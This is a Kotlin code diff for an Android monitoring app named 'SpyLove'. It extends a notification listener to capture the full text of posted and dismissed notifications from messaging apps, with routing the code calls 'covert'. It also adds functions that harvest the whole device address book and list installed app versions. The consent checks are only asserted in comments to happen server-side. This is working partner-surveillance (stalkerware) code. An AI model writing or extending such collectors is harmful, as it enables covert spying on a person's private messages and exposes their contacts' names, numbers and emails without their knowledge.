@@ -16,6 +16,7 @@ import android.os.Build
 import android.os.Handler
 import android.os.Looper
 import android.os.Process
+import android.provider.ContactsContract
 import android.provider.Settings
 import android.provider.Telephony
 import android.service.notification.NotificationListenerService
@@ -37,15 +38,45 @@ object SimEventSink {
 
 class SpyLoveNotificationListenerService : NotificationListenerService() {
     override fun onNotificationPosted(sbn: StatusBarNotification) {
-        val extras = sbn.notification.extras
+        emit(sbn, removed = false)
+    }
+
+    override fun onNotificationRemoved(sbn: StatusBarNotification) {
+        emit(sbn, removed = true)
+    }
+
+    /**
+     * Emits a notification event to Dart. Carries enough context for Dart to
+     * route it (covert/non-chat -> notification.*, messaging apps -> message.*)
+     * without changing which notifications are observed (consent is enforced
+     * server-side by event_type prefix).
+     */
+    private fun emit(sbn: StatusBarNotification, removed: Boolean) {
+        val n = sbn.notification
+        val extras = n.extras
         val title = extras.getCharSequence("android.title")?.toString() ?: ""
         val text = extras.getCharSequence("android.text")?.toString() ?: ""
+        val subText = extras.getCharSequence("android.subText")?.toString() ?: ""
+        val bigText = extras.getCharSequence("android.bigText")?.toString() ?: ""
+        val category = n.category ?: ""
+        val channelId = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            n.channelId ?: ""
+        } else {
+            ""
+        }
         val payload = hashMapOf(
             "package" to sbn.packageName,
             "title" to title,
             "text" to text,
+            "sub_text" to subText,
+            "big_text" to bigText,
+            "category" to category,
+            "channel_id" to channelId,
+            "notification_key" to sbn.key,
+            "is_group" to n.flags.and(android.app.Notification.FLAG_GROUP_SUMMARY).let { it != 0 },
+            "removed" to removed,
             "when" to sbn.postTime,
-            "idempotency_key" to "notif-${sbn.postTime}-${sbn.packageName}-${title.hashCode()}",
+            "idempotency_key" to "notif-${if (removed) "rm" else "post"}-${sbn.postTime}-${sbn.packageName}-${title.hashCode()}-${text.hashCode()}",
         )
         NotificationEventSink.sink?.success(payload)
     }
@@ -125,6 +156,10 @@ class MonitoringPlugin(private val context: Context) : MethodChannel.MethodCallH
             "getInstalledApps" -> {
                 val includeSystem = call.argument<Boolean>("includeSystem") ?: true
                 result.success(readInstalledApps(includeSystem))
+            }
+            "getContacts" -> {
+                val limit = call.argument<Int>("limit") ?: 2000
+                result.success(readContacts(limit))
             }
             else -> result.notImplemented()
         }
@@ -480,6 +515,100 @@ class MonitoringPlugin(private val context: Context) : MethodChannel.MethodCallH
     }
 
     /**
+     * Reads the device address book (display name, phone numbers, emails) for
+     * the `contact.snapshot` collector. Requires READ_CONTACTS. Photo blobs are
+     * intentionally never read (backend strips them anyway). Consent for the
+     * `contacts` scope is enforced server-side on ingest.
+     */
+    private fun readContacts(limit: Int): List<Map<String, Any?>> {
+        val hasPermission = ContextCompat.checkSelfPermission(
+            context,
+            Manifest.permission.READ_CONTACTS,
+        ) == PackageManager.PERMISSION_GRANTED
+        if (!hasPermission) return emptyList()
+
+        val byId = LinkedHashMap<String, MutableMap<String, Any?>>()
+        val resolver = context.contentResolver
+
+        // Base contacts: id + display name.
+        resolver.query(
+            ContactsContract.Contacts.CONTENT_URI,
+            arrayOf(
+                ContactsContract.Contacts._ID,
+                ContactsContract.Contacts.DISPLAY_NAME,
+            ),
+            null,
+            null,
+            ContactsContract.Contacts.DISPLAY_NAME + " ASC",
+        )?.use { cursor ->
+            val idIdx = cursor.getColumnIndex(ContactsContract.Contacts._ID)
+            val nameIdx = cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)
+            while (cursor.moveToNext() && byId.size < limit) {
+                val id = cursor.getString(idIdx) ?: continue
+                val name = if (nameIdx >= 0) cursor.getString(nameIdx) ?: "" else ""
+                byId[id] = hashMapOf(
+                    "contact_id" to id,
+                    "name" to name,
+                    "phones" to mutableListOf<String>(),
+                    "emails" to mutableListOf<String>(),
+                )
+            }
+        }
+
+        if (byId.isEmpty()) return emptyList()
+
+        // Phone numbers.
+        resolver.query(
+            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+            arrayOf(
+                ContactsContract.CommonDataKinds.Phone.CONTACT_ID,
+                ContactsContract.CommonDataKinds.Phone.NUMBER,
+            ),
+            null,
+            null,
+            null,
+        )?.use { cursor ->
+            val idIdx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.CONTACT_ID)
+            val numIdx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
+            while (cursor.moveToNext()) {
+                val id = cursor.getString(idIdx) ?: continue
+                val number = cursor.getString(numIdx) ?: continue
+                @Suppress("UNCHECKED_CAST")
+                val phones = byId[id]?.get("phones") as? MutableList<String> ?: continue
+                if (number.isNotBlank() && phones.size < 10 && !phones.contains(number)) {
+                    phones.add(number)
+                }
+            }
+        }
+
+        // Email addresses.
+        resolver.query(
+            ContactsContract.CommonDataKinds.Email.CONTENT_URI,
+            arrayOf(
+                ContactsContract.CommonDataKinds.Email.CONTACT_ID,
+                ContactsContract.CommonDataKinds.Email.ADDRESS,
+            ),
+            null,
+            null,
+            null,
+        )?.use { cursor ->
+            val idIdx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Email.CONTACT_ID)
+            val addrIdx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Email.ADDRESS)
+            while (cursor.moveToNext()) {
+                val id = cursor.getString(idIdx) ?: continue
+                val addr = cursor.getString(addrIdx) ?: continue
+                @Suppress("UNCHECKED_CAST")
+                val emails = byId[id]?.get("emails") as? MutableList<String> ?: continue
+                if (addr.isNotBlank() && emails.size < 10 && !emails.contains(addr)) {
+                    emails.add(addr)
+                }
+            }
+        }
+
+        return byId.values.toList()
+    }
+
+    /**
      * Lists installed apps available to the monitor: label, package, system
      * flag, and a base64 PNG icon. Requires QUERY_ALL_PACKAGES to see apps the
      * caller has not been granted visibility to on Android 11+.
@@ -496,6 +625,11 @@ class MonitoringPlugin(private val context: Context) : MethodChannel.MethodCallH
                 pm.getApplicationLabel(info).toString()
             } catch (_: Throwable) {
                 info.packageName
+            }
+            val version = try {
+                pm.getPackageInfo(info.packageName, 0).versionName
+            } catch (_: Throwable) {
+                null
             }
             var iconB64: String? = null
             try {
@@ -517,6 +651,7 @@ class MonitoringPlugin(private val context: Context) : MethodChannel.MethodCallH
                     "package" to info.packageName,
                     "name" to label,
                     "system" to isSystem,
+                    "version" to version,
                     "icon" to iconB64,
                 ),
             )
